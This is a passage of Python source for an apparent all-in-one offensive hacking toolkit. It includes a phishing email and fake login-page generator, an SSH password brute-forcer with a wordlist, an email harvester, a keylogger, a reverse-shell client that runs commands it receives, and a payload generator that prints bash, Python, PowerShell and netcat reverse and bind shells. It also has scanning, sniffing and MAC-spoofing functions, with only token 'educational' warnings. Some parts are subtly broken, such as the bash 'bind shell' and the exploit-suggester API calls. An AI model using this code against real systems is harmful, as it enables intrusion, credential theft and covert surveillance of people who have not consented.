    "/.git/refs/remotes/origin/v252.0.0", "/.git/refs/remotes/origin/v253.0.0", 
    "/.git/refs/remotes/origin/v254.0.0", "/.git/refs/remotes/origin/v255.0.0", 
    "/.git/refs/remotes/origin/v256.0.0", "/.git/refs/remotes/origin/v257.0.0", 
    "/.git/refs/remotes/origin/v258.0.0", "/.git/refs/remotes/origin/v259.0.0", 
    "/.git/refs/remotes/origin/v260.0.0", "/.git/refs/remotes/origin/v261.0.0", 
    "/.git/refs/remotes/origin/v262.0.0", "/.git/refs/remotes/origin/v263.0.0", 
    "/.git/refs/remotes/origin/v264.0.0", "/.git/refs/remotes/origin/v265.0.0", 
    "/.git/refs/remotes/origin/v266.0.0", "/.git/refs/remotes/origin/v267.0.0", 
    "/.git/refs/remotes/origin/v268.0.0", "/.git/refs/remotes/origin/v269.0.0", 
    "/.git/refs/remotes/origin/v270.0.0", "/.git/refs/remotes/origin/v271.0.0", 
    "/.git/refs/remotes/origin/v272.0.0", "/.git/refs/remotes/origin/v273.0.0", 
    "/.git/refs/remotes/origin/v274.0.0", "/.git/refs/remotes/origin/v275.0.0", 
    "/.git/refs/remotes/origin/v276.0.0", "/.git/refs/remotes/origin/v277.0.0", 
    "/.git/refs/remotes/origin/v278.0.0", "/.git/refs/remotes/origin/v279.0.0", 
    "/.git/refs/remotes/origin/v280.0.0", "/.git/refs/remotes/origin/v281.0.0", 
    "/.git/refs/remotes/origin/v282.0.0", "/.git/refs/remotes/origin/v283.0.0", 
    "/.git/refs/remotes/origin/v284.0.0", "/.git/refs/remotes/origin/v285.0.0", 
    "/.git/refs/remotes/origin/v286.0.0", "/.git/refs/remotes/origin/v287.0.0", 
    "/.git/refs/remotes/origin/v288.0.0", "/.git/refs/remotes/origin/v289.0.0", 
    "/.git/refs/remotes/origin/v290.0.0", "/.git/refs/remotes/origin/v291.0.0", 
    "/.git/refs/remotes/origin/v292.0.0", "/.git/refs/remotes/origin/v293.0.0", 
    "/.git/refs/remotes/origin/v294.0.0", "/.git/refs/remotes/origin/v295.0.0", 
    "/.git/refs/remotes/origin/v296.0.0", "/.git/refs/remotes/origin/v297.0.0", 
    "/.git/refs/remotes/origin/v298.0.0", "/.git/refs/remotes/origin/v299.0.0", 
    "/.git/refs/remotes/origin/v300.0.0", "/.git/refs/remotes/origin/v301.0.0", 
    "/.git/refs/remotes/origin/v302.0.0", "/.git/refs/remotes/origin/v303.0.0", 
    "/.git/refs/remotes/origin/v304.0.0", "/.git/refs/remotes/origin/v305.0.0", 
    "/.git/refs/remotes/origin/v306.0.0", "/.git/refs/remotes/origin/v307.0.0", 
    "/.git/refs/remotes/origin/v308.0.0", "/.git/refs/remotes/origin/v309.0.0", 
    "/.git/refs/remotes/origin/v310.0.0", "/.git/refs/remotes/origin/v311.0.0", 
    "/.git/refs/remotes/origin/v312.0.0", "/.git/refs/remotes/origin/v313.0.0", 
    "/.git/refs/remotes/origin/v314.0.0", "/.git/refs/remotes/origin/v315.0.0", 
    "/.git/refs/remotes/origin/v316.0.0", "/.git/refs/remotes/origin/v317.0.0", 
    "/.git/refs/remotes/origin/v318.0.0", "/.git/refs/remotes/origin/v319.0.0", ]
        for file in common_vulnerable_files:
            file_url = f"{url}{file}"
            file_response = requests.get(file_url, headers=headers, timeout=timeout)
            if file_response.status_code == 200:
                print(f"{Fore.RED}[-] Vulnerable file found: {file_url}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}   Explanation: This file may expose sensitive information or configuration details.{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: Failed to scan {url}. {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")

#==========================================================================================        

# Function for social engineering toolkit (basic phishing simulation)
def generate_phishing_email():
    """Generate a realistic phishing email template."""
    target = input("Enter target email: ")
    subject = input("Enter email subject: ")
    body = input("Enter email body: ")

    # Add a professional-looking email template
    email_template = f"""
    From: support@example.com
    To: {target}
    Subject: {subject}

    Dear User,

    {body}

    Please click the link below to verify your account:
    http://fake-phishing-url.com

    Sincerely,
    Support Team
    """
    print(f"\n{Fore.GREEN}Phishing Email Template:{Style.RESET_ALL}")
    print(email_template)

def simulate_phishing_url():
    """Simulate a phishing URL with a fake login page."""
    url = input("Enter phishing URL (e.g., http://fake-login.com): ")
    print(f"\n{Fore.GREEN}Simulating phishing URL: {url}{Style.RESET_ALL}")

    # Create a simple fake login page
    fake_login_page = f"""
    <html>
    <head><title>Login Page</title></head>
    <body>
        <h1>Login to Your Account</h1>
        <form action="{url}" method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """

    # Save the fake login page to a file
    file_name = "fake_login.html"
    with open(file_name, "w") as file:
        file.write(fake_login_page)

    # Open the fake login page in the default web browser
    webbrowser.open(f"file://{os.path.abspath(file_name)}")
    print(f"{Fore.YELLOW}This is a simulation. Always use ethical hacking responsibly!{Style.RESET_ALL}")

def social_engineering_toolkit():
    """Main function for the Social Engineering Toolkit."""
    print(f"\n{Fore.CYAN}=== Social Engineering Toolkit ==={Style.RESET_ALL}")
    print("1. Generate Phishing Email Template")
    print("2. Simulate Phishing URL")
    print("3. Exit")
    choice = input("Enter your choice: ")

    if choice == "1":
        generate_phishing_email()
    elif choice == "2":
        simulate_phishing_url()
    elif choice == "3":
        print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")

#==================================================================================================

# Function for DNS enumeration
def dns_enumeration(domain, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Enumerating DNS records for {domain}...{Style.RESET_ALL}")

    # List of DNS record types to query
    records = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA", "PTR", "SRV", "SPF"]

    found_records = {}

    def query_record(record):
        try:
            answers = dns.resolver.resolve(domain, record, lifetime=timeout)
            found_records[record] = [rdata.to_text() for rdata in answers]
        except dns.resolver.NoAnswer:
            pass
        except dns.resolver.NXDOMAIN:
            print(f"{Fore.RED}Error: Domain {domain} does not exist.{Style.RESET_ALL}")
        except dns.resolver.Timeout:
            print(f"{Fore.RED}Error: DNS query timed out for {record} record.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

    # Use ThreadPoolExecutor for concurrent DNS queries
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(query_record, record) for record in records]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(records)}{Style.RESET_ALL}", end="\r")

    # Display results
    if found_records:
        print(f"\n{Fore.GREEN}DNS Records for {domain}:{Style.RESET_ALL}")
        for record, data in found_records.items():
            print(f"\n{Fore.YELLOW}{record} Records:{Style.RESET_ALL}")
            for item in data:
                print(item)
    else:
        print(f"\n{Fore.RED}No DNS records found for {domain}.{Style.RESET_ALL}")

#============================================================================================================

def os_fingerprinting(target, nmap_options="-O"):
    """
    Perform OS fingerprinting using Nmap.
    """
    print(f"\n{Fore.CYAN}Performing OS fingerprinting on {target}...{Style.RESET_ALL}")
    try:
        command = ["nmap", nmap_options, target]
        response = subprocess.check_output(command, stderr=subprocess.STDOUT)
        print(f"{Fore.GREEN}Nmap Output:{Style.RESET_ALL}")
        print(response.decode())
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error: {e.output.decode()}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def network_sniffer(interface, count=10, timeout=30, filter_protocol=None):
    """
    Sniff network packets on a specified interface.
    """
    print(f"\n{Fore.CYAN}Sniffing {count} packets on interface {interface}...{Style.RESET_ALL}")
    try:
        # Define a packet filter based on the protocol
        if filter_protocol == "tcp":
            filter_rule = "tcp"
        elif filter_protocol == "udp":
            filter_rule = "udp"
        elif filter_protocol == "icmp":
            filter_rule = "icmp"
        else:
            filter_rule = None

        packets = sniff(iface=interface, count=count, timeout=timeout, filter=filter_rule)
        for packet in packets:
            if IP in packet:
                src = packet[IP].src
                dst = packet[IP].dst
                protocol = "Unknown"
                if TCP in packet:
                    protocol = "TCP"
                elif UDP in packet:
                    protocol = "UDP"
                elif ICMP in packet:
                    protocol = "ICMP"
                print(f"{Fore.GREEN}Source: {src} -> Destination: {dst} | Protocol: {protocol}{Style.RESET_ALL}")
                if protocol == "TCP":
                    print(f"   Flags: {packet[TCP].flags}, Payload: {packet[TCP].payload}")
                elif protocol == "UDP":
                    print(f"   Payload: {packet[UDP].payload}")
                elif protocol == "ICMP":
                    print(f"   Type: {packet[ICMP].type}, Code: {packet[ICMP].code}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def exploit_suggester(service, version):
    """
    Suggest exploits for a given service and version.
    """
    print(f"\n{Fore.CYAN}Suggesting exploits for {service} {version}...{Style.RESET_ALL}")
    try:
        # Query Shodan for exploits
        shodan_url = f"https://exploits.shodan.io/api/search?query={service}:{version}"
        shodan_response = requests.get(shodan_url)
        shodan_exploits = shodan_response.json()

        # Query Exploit-DB for exploits
        exploitdb_url = f"https://www.exploit-db.com/search?q={service} {version}"
        exploitdb_response = requests.get(exploitdb_url)
        exploitdb_exploits = exploitdb_response.json()

        # Display results
        if shodan_exploits or exploitdb_exploits:
            print(f"{Fore.YELLOW}Possible exploits:{Style.RESET_ALL}")
            if shodan_exploits:
                print(f"\n{Fore.GREEN}From Shodan:{Style.RESET_ALL}")
                for exploit in shodan_exploits:
                    print(f"- {exploit['description']} (CVE: {exploit.get('cve', 'N/A')})")
            if exploitdb_exploits:
                print(f"\n{Fore.GREEN}From Exploit-DB:{Style.RESET_ALL}")
                for exploit in exploitdb_exploits:
                    print(f"- {exploit['description']} (Link: {exploit.get('url', 'N/A')})")
        else:
            print(f"{Fore.RED}No exploits found.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

#========================================================================================

# Function for brute-force SSH
def brute_force_ssh(target, username, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Brute-forcing SSH on {target} with username {username}...{Style.RESET_ALL}")

    # Dynamic wordlist of common passwords
    common_passwords = [
        "password", "123456", "12345678", "1234", "qwerty", "12345", "dragon", "baseball", 
        "football", "letmein", "monkey", "abc123", "mustang", "michael", "shadow", "master", 
        "jennifer", "111111", "2000", "jordan", "superman", "harley", "1234567", "freedom", 
        "hello", "charlie", "trustno1", "123123", "starwars", "welcome", "admin", "login", 
        "passw0rd", "password1", "123456789", "1234567890", "qwerty123", "1q2w3e4r", "sunshine", 
        "iloveyou", "princess", "solo", "wizard", "password123", "admin123", "letmein123", 
        "123qwe", "123abc", "123456a", "123456b", "123456c", "123456d", "123456e", "123456f", 
        "123456g", "123456h", "123456i", "123456j", "123456k", "123456l", "123456m", "123456n", 
        "123456o", "123456p", "123456q", "123456r", "123456s", "123456t", "123456u", "123456v", 
        "123456w", "123456x", "123456y", "123456z", "qwertyuiop", "asdfghjkl", "zxcvbnm", 
        "qazwsx", "password!", "password@", "password#", "password$", "password%", "password^", 
        "password&", "password*", "password(", "password)", "password-", "password_", "password+", 
        "password=", "password{", "password}", "password[", "password]", "password|", "password\\", 
        "password:", "password;", "password\"", "password'", "password<", "password>", "password?", 
        "password/", "password`", "password~", "password.", "password,", "password ", "password0", 
        "password01", "password02", "password03", "password04", "password05", "password06", 
        "password07", "password08", "password09", "password10", "password11", "password12", 
        "password13", "password14", "password15", "password16", "password17", "password18", 
        "password19", "password20", "password21", "password22", "password23", "password24", 
        "password25", "password26", "password27", "password28", "password29", "password30", 
        "password31", "password32", "password33", "password34", "password35", "password36", 
        "password37", "password38", "password39", "password40", "password41", "password42", 
        "password43", "password44", "password45", "password46", "password47", "password48", 
        "password49", "password50", "password51", "password52", "password53", "password54", 
        "password55", "password56", "password57", "password58", "password59", "password60", 
        "password61", "password62", "password63", "password64", "password65", "password66", 
        "password67", "password68", "password69", "password70", "password71", "password72", 
        "password73", "password74", "password75", "password76", "password77", "password78", 
        "password79", "password80", "password81", "password82", "password83", "password84", 
        "password85", "password86", "password87", "password88", "password89", "password90", 
        "password91", "password92", "password93", "password94", "password95", "password96", 
        "password97", "password98", "password99", "password100"
    ]

    found = False

    def try_password(password):
        nonlocal found
        if found:  # Stop if the password is already found
            return
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=timeout)
            print(f"{Fore.GREEN}[+] Success! Password: {password}{Style.RESET_ALL}")
            ssh.close()
            found = True
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[-] Failed: {password}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

    # Use ThreadPoolExecutor for concurrent password attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_password, password) for password in common_passwords]
        
        # Simple progress indicator
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            if found:
                break  # Stop if the password is found
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(common_passwords)}{Style.RESET_ALL}", end="\r")

    if not found:
        print(f"\n{Fore.RED}[-] Password not found in the common password list.{Style.RESET_ALL}")

#=========================================================================================================

# Function for web crawling
def web_crawler(start_url, max_pages=10, max_depth=3, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Crawling {start_url} (max {max_pages} pages, depth {max_depth})...{Style.RESET_ALL}")

    visited = set()
    queue = [(start_url, 0)]  # (url, depth)
    domain = urlparse(start_url).netloc

    def crawl_page(url, depth):
        if url in visited or depth > max_depth:
            return
        visited.add(url)
        print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
        try:
            response = requests.get(url, timeout=timeout)
            for link in re.findall(r'href="(https?://[^"]+)"', response.text):
                parsed_link = urlparse(link)
                if parsed_link.netloc == domain and link not in visited:
                    queue.append((link, depth + 1))
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error: Failed to crawl {url}. {e}{Style.RESET_ALL}")

    # Use ThreadPoolExecutor for concurrent crawling
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        while queue and len(visited) < max_pages:
            current_url, current_depth = queue.pop(0)
            executor.submit(crawl_page, current_url, current_depth)
            print(f"{Fore.YELLOW}Progress: {len(visited)}/{max_pages}{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Crawling completed. Found {len(visited)} pages.{Style.RESET_ALL}")

#====================-----===================-----=================-----================---=-=======-=-=-=-=-
# Function for email harvesting
def email_harvester(start_url, max_pages=10, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Harvesting emails from {start_url} (max {max_pages} pages)...{Style.RESET_ALL}")

    visited = set()
    queue = [start_url]
    domain = urlparse(start_url).netloc
    emails_found = set()

    def harvest_emails(url):
        if url in visited:
            return
        visited.add(url)
        try:
            response = requests.get(url, timeout=timeout)
            emails = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', response.text)
            for email in emails:
                if email not in emails_found:
                    emails_found.add(email)
                    print(f"{Fore.GREEN}[+] Found: {email}{Style.RESET_ALL}")
            # Find and add linked pages to the queue
            for link in re.findall(r'href="(https?://[^"]+)"', response.text):
                parsed_link = urlparse(link)
                if parsed_link.netloc == domain and link not in visited:
                    queue.append(link)
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error: Failed to crawl {url}. {e}{Style.RESET_ALL}")

    # Use ThreadPoolExecutor for concurrent email harvesting
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        while queue and len(visited) < max_pages:
            current_url = queue.pop(0)
            executor.submit(harvest_emails, current_url)
            print(f"{Fore.YELLOW}Progress: {len(visited)}/{max_pages}{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Email harvesting completed. Found {len(emails_found)} emails.{Style.RESET_ALL}")

#=========================================================================================================

# Function for Wi-Fi scanning
def wifi_scan():
    print(f"\n{Fore.CYAN}Scanning for Wi-Fi networks...{Style.RESET_ALL}")
    try:
        if platform.system() == "Linux":
            # Use nmcli on Linux
            result = subprocess.check_output(["nmcli", "-t", "-f", "SSID,SECURITY,SIGNAL", "dev", "wifi"])
            networks = result.decode().splitlines()
            print(f"{Fore.YELLOW}SSID{' ' * 20}SECURITY{' ' * 10}SIGNAL{Style.RESET_ALL}")
            for network in networks:
                ssid, security, signal = network.split(":")
                print(f"{Fore.GREEN}{ssid.ljust(25)}{security.ljust(20)}{signal.rjust(5)}%{Style.RESET_ALL}")
        elif platform.system() == "Windows":
            # Use netsh on Windows
            result = subprocess.check_output(["netsh", "wlan", "show", "networks"], stderr=subprocess.STDOUT)
            networks = result.decode().split("\r\n\r\n")
            for network in networks:
                if "SSID" in network:
                    ssid = network.split("SSID")[1].split(":")[1].strip()
                    security = network.split("Authentication")[1].split(":")[1].strip()
                    signal = network.split("Signal")[1].split(":")[1].strip()
                    print(f"{Fore.GREEN}SSID: {ssid.ljust(25)}Security: {security.ljust(20)}Signal: {signal.rjust(5)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Error: Unsupported platform.{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error: {e.output.decode()}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

#=========================----====================----===============================================

# Function for keylogger simulation
# Configuration
LOG_FILE = "keystrokes.log"  # File to save keystrokes
EXIT_KEY_COMBINATION = {keyboard.Key.ctrl, keyboard.Key.esc}  # Press Ctrl+Esc to exit

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.current_keys = set()

    def on_press(self, key):
        """Logs the key when it is pressed."""
        try:
            # Add the key to the current keys set
            self.current_keys.add(key)
            # Check for exit key combination
            if self.current_keys == EXIT_KEY_COMBINATION:
                print(f"{Fore.RED}Exiting keylogger...{Style.RESET_ALL}")
                return False  # Stop the listener
            # Log the key
            self.log += str(key).strip("'")
            print(f"{Fore.GREEN}[+] Key pressed: {key}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

    def on_release(self, key):
        """Removes the key from the current keys set when it is released."""
        try:
            if key in self.current_keys:
                self.current_keys.remove(key)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

    def start(self):
        """Starts the keylogger."""
        print(f"{Fore.CYAN}Starting keylogger (Press Ctrl+Esc to stop)...{Style.RESET_ALL}")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def save_log(self):
        """Saves the logged keystrokes to a file."""
        try:
            with open(LOG_FILE, "a") as f:
                f.write(self.log + "\n")
            print(f"{Fore.GREEN}Keystrokes saved to {LOG_FILE}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error saving log: {e}{Style.RESET_ALL}")

def keylogger_simulator():
    print(f"\n{Fore.CYAN}=== Keylogger Simulator (Educational Purposes Only) ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    logger = KeyLogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        print(f"{Fore.RED}Keylogger stopped by user.{Style.RESET_ALL}")
    finally:
        logger.save_log()

#=========================================================================
# Function for reverse shell
def reverse_shell(ip, port):
    print(f"\n{Fore.CYAN}Creating reverse shell to {ip}:{port}...{Style.RESET_ALL}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"{Fore.GREEN}[+] Connected to target.{Style.RESET_ALL}")
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

# Function for cryptography (encrypt/decrypt)
def cryptography_tool():
    print(f"\n{Fore.CYAN}=== Cryptography Tool ==={Style.RESET_ALL}")
    print("1. Encrypt Text")
    print("2. Decrypt Text")
    choice = input("Enter your choice: ")
    if choice == "1":
        key = Fernet.generate_key()
        cipher = Fernet(key)
        text = input("Enter text to encrypt: ")
        encrypted = cipher.encrypt(text.encode())
        print(f"\n{Fore.GREEN}Encrypted Text: {encrypted.decode()}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Key: {key.decode()}{Style.RESET_ALL}")
    elif choice == "2":
        key = input("Enter key: ")
        cipher = Fernet(key.encode())
        encrypted = input("Enter encrypted text: ")
        decrypted = cipher.decrypt(encrypted.encode())
        print(f"\n{Fore.GREEN}Decrypted Text: {decrypted.decode()}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")

# Function for firewall bypass (simulated)
def firewall_bypass(target, port, technique="source_port_randomization"):
    print(f"\n{Fore.CYAN}Attempting to bypass firewall on {target}:{port}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")

    try:
        if technique == "source_port_randomization":
            # Technique 1: Randomize source port
            source_port = random.randint(1024, 65535)
            print(f"{Fore.YELLOW}Using source port randomization (source port: {source_port})...{Style.RESET_ALL}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(("0.0.0.0", source_port))
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                print(f"{Fore.GREEN}[+] Successfully bypassed firewall on port {port}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to bypass firewall{Style.RESET_ALL}")

        elif technique == "fragmentation":
            # Technique 2: Simulate packet fragmentation
            print(f"{Fore.YELLOW}Simulating packet fragmentation...{Style.RESET_ALL}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.settimeout(2)
            # Simulate fragmented packet (this is a simplified example)
            try:
                sock.sendto(b"fragmented_packet", (target, port))
                print(f"{Fore.GREEN}[+] Fragmented packet sent to {target}:{port}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            sock.close()

        elif technique == "protocol_spoofing":
            # Technique 3: Spoof protocol (e.g., use UDP instead of TCP)
            print(f"{Fore.YELLOW}Using protocol spoofing (UDP instead of TCP)...{Style.RESET_ALL}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            try:
                sock.sendto(b"spoofed_packet", (target, port))
                print(f"{Fore.GREEN}[+] Spoofed packet sent to {target}:{port}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            sock.close()

        else:
            print(f"{Fore.RED}Invalid technique selected.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

#=====================================================================================================

# Function for payload generator
def payload_generator():
    print(f"\n{Fore.CYAN}=== Payload Generator ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")
    print("1. Reverse Shell Payload")
    print("2. Bind Shell Payload")
    print("3. Exit")
    choice = input("Enter your choice: ")

    if choice == "1":
        print(f"\n{Fore.GREEN}=== Reverse Shell Payload ==={Style.RESET_ALL}")
        ip = input("Enter your IP: ")
        port = input("Enter port: ")
        print("\nChoose a payload type:")
        print("1. Bash")
        print("2. Python")
        print("3. PowerShell")
        print("4. Netcat")
        payload_type = input("Enter your choice: ")

        if payload_type == "1":
            print(f"\n{Fore.GREEN}Bash Reverse Shell:{Style.RESET_ALL}")
            print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        elif payload_type == "2":
            print(f"\n{Fore.GREEN}Python Reverse Shell:{Style.RESET_ALL}")
            print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        elif payload_type == "3":
            print(f"\n{Fore.GREEN}PowerShell Reverse Shell:{Style.RESET_ALL}")
            print(f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"")
        elif payload_type == "4":
            print(f"\n{Fore.GREEN}Netcat Reverse Shell:{Style.RESET_ALL}")
            print(f"nc -e /bin/sh {ip} {port}")
        else:
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")

    elif choice == "2":
        print(f"\n{Fore.GREEN}=== Bind Shell Payload ==={Style.RESET_ALL}")
        port = input("Enter port: ")
        print("\nChoose a payload type:")
        print("1. Bash")
        print("2. Python")
        print("3. PowerShell")
        print("4. Netcat")
        payload_type = input("Enter your choice: ")

        if payload_type == "1":
            print(f"\n{Fore.GREEN}Bash Bind Shell:{Style.RESET_ALL}")
            print(f"bash -i >& /dev/tcp/0.0.0.0/{port} 0>&1")
        elif payload_type == "2":
            print(f"\n{Fore.GREEN}Python Bind Shell:{Style.RESET_ALL}")
            print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        elif payload_type == "3":
            print(f"\n{Fore.GREEN}PowerShell Bind Shell:{Style.RESET_ALL}")
            print(f"powershell -nop -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()\"")
        elif payload_type == "4":
            print(f"\n{Fore.GREEN}Netcat Bind Shell:{Style.RESET_ALL}")
            print(f"nc -lvp {port} -e /bin/bash")
        else:
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")

    elif choice == "3":
        print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")
#===========================================================================================

# Function for MAC address spoofer
def generate_random_mac():
    """Generate a random MAC address."""
    return ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])

def validate_mac(mac):
    """Validate the MAC address format."""
    return re.match(r"^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$", mac) is not None

def get_current_mac(interface):
    """Get the current MAC address of the specified interface."""
    try:
        output = subprocess.check_output(["ifconfig", interface], stderr=subprocess.STDOUT).decode()
        mac_match = re.search(r"ether (([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})", output)
        if mac_match:
            return mac_match.group(1)
        else:
            return None
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error: {e.output.decode()}{Style.RESET_ALL}")
        return None

def mac_spoofer(interface, new_mac=None):
    print(f"\n{Fore.CYAN}=== MAC Address Spoofer ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: This tool is for educational purposes only. Do not use it for unethical or illegal activities.{Style.RESET_ALL}")

    # Get the current MAC address
    current_mac = get_current_mac(interface)
    if current_mac:
        print(f"{Fore.GREEN}Current MAC address: {current_mac}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Error: Could not retrieve current MAC address.{Style.RESET_ALL}")
        return

    # Generate or validate the new MAC address
    if new_mac is None:
        new_mac = generate_random_mac()
    elif not validate_mac(new_mac):
        print(f"{Fore.RED}Error: Invalid MAC address format.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}Attempting to change MAC address to: {new_mac}{Style.RESET_ALL}")

    try:
        # Disable the interface
        subprocess.call(["sudo", "ifconfig", interface, "down"], stderr=subprocess.STDOUT)
        # Change the MAC address
        subprocess.call(["sudo", "ifconfig", interface, "hw", "ether", new_mac], stderr=subprocess.STDOUT)
        # Enable the interface
        subprocess.call(["sudo", "ifconfig", interface, "up"], stderr=subprocess.STDOUT)
        # Verify the new MAC address
        updated_mac = get_current_mac(interface)
        if updated_mac == new_mac:
            print(f"{Fore.GREEN}[+] MAC address successfully changed to: {new_mac}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to change MAC address.{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error: {e.output.decode()}{Style.RESET_ALL}")
    except Exception as e:
